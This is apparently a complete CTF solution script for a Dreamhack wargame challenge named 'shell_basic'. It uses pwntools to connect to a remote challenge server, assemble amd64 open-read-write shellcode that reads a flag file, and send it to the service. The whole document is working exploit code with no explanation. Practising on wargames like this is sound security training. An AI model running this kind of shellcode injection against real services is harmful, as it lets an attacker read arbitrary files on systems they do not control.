from pwn import *
context.log_level       = "DEBUG"
context.arch            = "amd64"

p = remote("host3.dreamhack.games", 17164)
fpath = "/home/shell_basic/flag_name_is_loooooong"

shell = shellcraft.open(fpath)
shell += shellcraft.read("rax", "rsp", "0x30")
shell += shellcraft.write(1, "rsp", "0x30")

p.recvuntil("shellcode: ")
p.sendline(asm(shell))
p.interactive()
